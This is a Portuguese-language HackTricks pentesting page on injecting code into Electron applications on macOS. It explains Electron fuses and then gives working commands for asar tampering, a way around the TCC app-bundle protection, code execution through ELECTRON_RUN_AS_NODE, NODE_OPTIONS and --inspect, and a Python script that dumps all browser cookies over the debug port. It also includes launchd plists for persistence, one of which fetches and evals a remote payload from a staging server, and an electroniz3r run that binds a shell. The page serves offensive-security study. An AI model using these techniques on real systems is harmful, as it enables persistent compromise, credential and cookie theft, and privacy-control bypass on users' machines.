# Injeção em Aplicações Electron no macOS

<details>

<summary><strong>Aprenda hacking no AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se você quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs exclusivos**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga**-me no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios do GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Informações Básicas

Se você não sabe o que é Electron, pode encontrar [**muitas informações aqui**](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/xss-to-rce-electron-desktop-apps). Mas por agora saiba apenas que Electron executa **node**.\
E node tem alguns **parâmetros** e **variáveis de ambiente** que podem ser usados para **fazer com que ele execute outro código** além do arquivo indicado.

### Fusíveis do Electron

Essas técnicas serão discutidas a seguir, mas recentemente o Electron adicionou várias **flags de segurança para preveni-las**. Estas são os [**Fusíveis do Electron**](https://www.electronjs.org/docs/latest/tutorial/fuses) e estes são os usados para **prevenir** que aplicativos Electron no macOS **carreguem código arbitrário**:

* **`RunAsNode`**: Se desativado, impede o uso da variável de ambiente **`ELECTRON_RUN_AS_NODE`** para injetar código.
* **`EnableNodeCliInspectArguments`**: Se desativado, parâmetros como `--inspect`, `--inspect-brk` não serão respeitados. Evitando assim a injeção de código.
* **`EnableEmbeddedAsarIntegrityValidation`**: Se ativado, o arquivo **`asar`** **carregado** será **validado** pelo macOS. **Prevenindo** assim a **injeção de código** ao modificar o conteúdo deste arquivo.
* **`OnlyLoadAppFromAsar`**: Se isso estiver ativado, em vez de procurar carregar na seguinte ordem: **`app.asar`**, **`app`** e finalmente **`default_app.asar`**. Ele verificará e usará apenas app.asar, garantindo assim que, quando **combinado** com o fusível **`embeddedAsarIntegrityValidation`**, seja **impossível** **carregar código não validado**.
* **`LoadBrowserProcessSpecificV8Snapshot`**: Se ativado, o processo do navegador usa o arquivo chamado `browser_v8_context_snapshot.bin` para seu snapshot V8.

Outro fusível interessante que não estará prevenindo a injeção de código é:

* **EnableCookieEncryption**: Se ativado, o armazenamento de cookies no disco é criptografado usando chaves de criptografia do nível do sistema operacional.

### Verificando Fusíveis do Electron

Você pode **verificar essas flags** de uma aplicação com:
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### Modificando Fusíveis do Electron

Conforme mencionado na [**documentação**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), a configuração dos **Fusíveis do Electron** está dentro do **binário do Electron**, que contém em algum lugar a string **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`**.

Em aplicações macOS, isso é tipicamente encontrado em `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
Você pode carregar este arquivo em [https://hexed.it/](https://hexed.it/) e procurar pela string anterior. Após esta string, você pode ver em ASCII um número "0" ou "1" indicando se cada fusível está desativado ou ativado. Basta modificar o código hexadecimal (`0x30` é `0` e `0x31` é `1`) para **modificar os valores do fusível**.

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Note que se você tentar **sobrescrever** o **binário `Electron Framework`** dentro de um aplicativo com esses bytes modificados, o aplicativo não funcionará.

## RCE adicionando código a Aplicações Electron

Pode haver **arquivos JS/HTML externos** que um Aplicativo Electron está usando, então um atacante poderia injetar código nesses arquivos cuja assinatura não será verificada e executar código arbitrário no contexto do aplicativo.

{% hint style="danger" %}
No entanto, no momento existem 2 limitações:

* A permissão **`kTCCServiceSystemPolicyAppBundles`** é **necessária** para modificar um App, então por padrão isso não é mais possível.
* O arquivo **`asap`** compilado geralmente tem os fusíveis **`embeddedAsarIntegrityValidation`** `e` **`onlyLoadAppFromAsar`** `ativados`

Tornando este caminho de ataque mais complicado (ou impossível).
{% endhint %}

Note que é possível contornar a exigência de **`kTCCServiceSystemPolicyAppBundles`** copiando o aplicativo para outro diretório (como **`/tmp`**), renomeando a pasta **`app.app/Contents`** para **`app.app/NotCon`**, **modificando** o arquivo **asar** com seu código **malicioso**, renomeando-o de volta para **`app.app/Contents`** e executando-o.

Você pode desempacotar o código do arquivo asar com:
```bash
npx asar extract app.asar app-decomp
```
E empacote-o novamente após modificá-lo com:
```bash
npx asar pack app-decomp app-new.asar
```
## RCE com `ELECTRON_RUN_AS_NODE` <a href="#electron_run_as_node" id="electron_run_as_node"></a>

De acordo com [**a documentação**](https://www.electronjs.org/docs/latest/api/environment-variables#electron\_run\_as\_node), se essa variável de ambiente estiver definida, o processo será iniciado como um processo normal do Node.js.

{% code overflow="wrap" %}
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
Se o fusível **`RunAsNode`** estiver desativado, a variável de ambiente **`ELECTRON_RUN_AS_NODE`** será ignorada e isso não funcionará.
{% endhint %}

### Injeção a partir do Plist do Aplicativo

Como [**proposto aqui**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), você poderia abusar dessa variável de ambiente em um plist para manter persistência:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## RCE com `NODE_OPTIONS`

Você pode armazenar o payload em um arquivo diferente e executá-lo:

{% code overflow="wrap" %}
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
{% endcode %}

{% hint style="danger" %}
Se o fusível **`EnableNodeOptionsEnvironmentVariable`** estiver **desativado**, o aplicativo **ignorará** a variável de ambiente **NODE\_OPTIONS** quando iniciado, a menos que a variável de ambiente **`ELECTRON_RUN_AS_NODE`** esteja definida, que também será **ignorada** se o fusível **`RunAsNode`** estiver desativado.

Se você não definir **`ELECTRON_RUN_AS_NODE`**, você encontrará o **erro**: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`
{% endhint %}

### Injeção a partir do Plist do Aplicativo

Você poderia abusar dessa variável de ambiente em um plist para manter a persistência adicionando estas chaves:
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## RCE com inspeção

De acordo com [**este**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f) artigo, se você executar uma aplicação Electron com flags como **`--inspect`**, **`--inspect-brk`** e **`--remote-debugging-port`**, um **porta de depuração será aberta** para que você possa se conectar a ela (por exemplo, do Chrome em `chrome://inspect`) e será capaz de **injetar código nela** ou até mesmo iniciar novos processos.\
Por exemplo:

{% code overflow="wrap" %}
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
Se o fusível **`EnableNodeCliInspectArguments`** estiver desativado, o aplicativo irá **ignorar parâmetros do node** (como `--inspect`) quando iniciado, a menos que a variável de ambiente **`ELECTRON_RUN_AS_NODE`** esteja definida, que também será **ignorada** se o fusível **`RunAsNode`** estiver desativado.

No entanto, ainda é possível usar o parâmetro **electron `--remote-debugging-port=9229`**, mas o payload anterior não funcionará para executar outros processos.
{% endhint %}

Usando o parâmetro **`--remote-debugging-port=9222`**, é possível roubar algumas informações do aplicativo Electron, como o **histórico** (com comandos GET) ou os **cookies** do navegador (já que são **descriptografados** dentro do navegador e há um **ponto de extremidade json** que os fornecerá).

Você pode aprender como fazer isso [**aqui**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) e [**aqui**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) e usar a ferramenta automática [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) ou um script simples como:
```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```
No [**este post do blog**](https://hackerone.com/reports/1274695), esse debug é abusado para fazer um chrome headless **baixar arquivos arbitrários em locais arbitrários**.

### Injeção a partir do Plist do App

Você poderia abusar dessa variável de ambiente em um plist para manter persistência adicionando estas chaves:
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## Bypass do TCC abusando de Versões Antigas

{% hint style="success" %}
O daemon TCC do macOS não verifica a versão executada da aplicação. Então, se você **não pode injetar código em uma aplicação Electron** com nenhuma das técnicas anteriores, você poderia baixar uma versão anterior do APP e injetar código nela, pois ela ainda obterá os privilégios do TCC (a menos que o Trust Cache o impeça).
{% endhint %}

## Executar Código não JS

As técnicas anteriores permitirão que você execute **código JS dentro do processo da aplicação Electron**. No entanto, lembre-se de que os **processos filhos são executados sob o mesmo perfil de sandbox** que a aplicação pai e **herdam suas permissões TCC**.\
Portanto, se você quiser abusar de direitos para acessar a câmera ou microfone, por exemplo, você poderia simplesmente **executar outro binário a partir do processo**.

## Injeção Automática

A ferramenta [**electroniz3r**](https://github.com/r3ggi/electroniz3r) pode ser facilmente usada para **encontrar aplicações Electron vulneráveis** instaladas e injetar código nelas. Esta ferramenta tentará usar a técnica **`--inspect`**:

Você precisa compilá-la você mesmo e pode usá-la assim:
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
## Referências

* [https://www.electronjs.org/docs/latest/tutorial/fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
* [https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
* [https://m.youtube.com/watch?v=VWQY5R2A6X8](https://m.youtube.com/watch?v=VWQY5R2A6X8)

<details>

<summary><strong>Aprenda hacking em AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se você quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga**-me no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios do github** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
